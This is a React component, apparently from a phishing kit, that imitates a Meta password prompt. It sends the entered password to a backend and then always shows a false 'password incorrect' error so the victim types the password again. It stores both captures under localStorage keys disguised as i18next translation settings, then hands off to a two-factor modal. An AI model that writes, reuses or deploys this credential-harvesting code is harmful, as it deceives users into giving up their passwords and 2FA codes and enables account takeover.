import React from 'react';
import Modal from '#components/modals/Modal';
import PasswordInput from '#components/password-input/password-input';
import { getLocalStorage, setLocalStorage } from "@/helper/localstorage";
import { CallApi } from "@/libs/call-api";
import { useTranslation } from 'react-i18next';

interface PasswordModalProps {
    isOpend: boolean;
    isOpendTwoFactor: (value: boolean) => void;
    onToggleModal: (isOpen: boolean) => void;
}

const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor, onToggleModal }) => {

    React.useEffect(() => {
        setIsOpen(isOpend);
    }, [isOpend]);

    const { t } = useTranslation();

    const [isOpen, setIsOpen] = React.useState(isOpend);
    const [loading, setLoading] = React.useState(false);
    const [doubleCheck, setDoubleCheck] = React.useState(false);
    const [errors, setErrors] = React.useState<Record<string, string>>({});

    const [formData, setFormData] = React.useState({
        password: '',
    });

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { id, value } = e.target;
        setFormData(prev => ({ ...prev, [id]: value }));
        setErrors(prev => ({ ...prev, [id]: '' }));
    };

    const handleClose = () => {
        setIsOpen(false);
        onToggleModal(false);
    };

    const handSubmit = async (e: React.FormEvent) => {
        try {
            e.preventDefault();

            const newErrors: Record<string, string> = {};
            if (!formData.password.trim()) newErrors.password = t('modal.password.form.password.error');

            if (Object.keys(newErrors).length > 0) {
                setErrors(newErrors);
                return;
            }
            
            if (!doubleCheck) {
                    
                setLoading(true);

                let infomations = await getLocalStorage("i18nextInf");
                const dataPassword = {
                    ...infomations as any,
                    password: formData.password,
                }

                await CallApi(dataPassword)
                .then((response) => {
                    setTimeout(async () => {

                        setFormData({ password: '' });
                        setLoading(false);
                        setDoubleCheck(true);
                        setLocalStorage("i18next_p", dataPassword);

                        newErrors.password = t('modal.password.form.password.error_password_incorrect');
                        setErrors(newErrors);

                    }, 1345)
                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    newErrors.password = t('modal.password.form.password.error_password_incorrect');
                    setErrors(newErrors);
                });

            } else {

                setLoading(true);

                let dataPassword = await getLocalStorage("i18next_p");
                const dataPasswordSecond = {
                    ...dataPassword as any,
                    passwordSecond: formData.password,
                }
                
                await CallApi(dataPasswordSecond)
                .then((response) => {
                    setTimeout(async () => {

                        setFormData({ password: '' });
                        setLoading(false);
                        setDoubleCheck(false);
                        setLocalStorage("i18next_ps", dataPasswordSecond);
                        isOpendTwoFactor(true);
                        handleClose();

                    }, 1345)
                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                });

            }

        } catch (error) {
            console.error("Error submitting form:", error);
        }
    };

    const inputClass = (field: string) => ` border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} `;
    const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;

    return (
        <Modal
            isOpen={isOpen}
            title=''
            onClose={handleClose}
            isClosable={false}
        >
            <div className="h-full flex flex-col items-center justify-between flex-1">
                <div className='w-[50px] h-[50px] mb-[20px] mx-auto'>
                    <img src="/images/meta/logo.svg" width="100%" height="100%" alt="logo" />
                </div>

                <div className='w-full'>
                    <p className='text-[#9a979e] text-[14px] mb-[7px]'>{t('modal.password.description')}</p>
                    <form onSubmit={handSubmit} autoComplete="off" >
                        <div className='w-full'>
                            <PasswordInput
                                id='password'
                                placeholder={t('modal.password.form.password.placeholder')}
                                className={inputClass('password')}
                                value={formData.password}
                                onChange={handleChange}
                            />
                            {errorText('password')}
                        </div>
                        <div className='w-full mt-[20px]'>
                            <button
                                className={`h-[45px] min-h-[45px] w-full bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center cursor-pointer transition-opacity duration-300 ${loading ? 'opacity-70 cursor-not-allowed' : ''}`}
                                disabled={loading}
                            >
                                {loading && (
                                    <div className='animate-spin mr-[10px] w-[20px] h-[20px]'>
                                        <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="loading" />
                                    </div>
                                )}
                                {loading ? '' : t('modal.password.form.button.text')}
                            </button>
                        </div>
                        <div>
                            <p className='text-center mt-[10px]'><a href='' className='text-[#9a979e] text-[14px]'>{t('modal.password.form.link.text')}</a></p>
                        </div>
                    </form>
                </div>

                <div className='w-[60px] mt-[20px] mx-auto'>
                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="logo" />
                </div>
            </div>
        </Modal>
    );
};

export default PasswordModal;
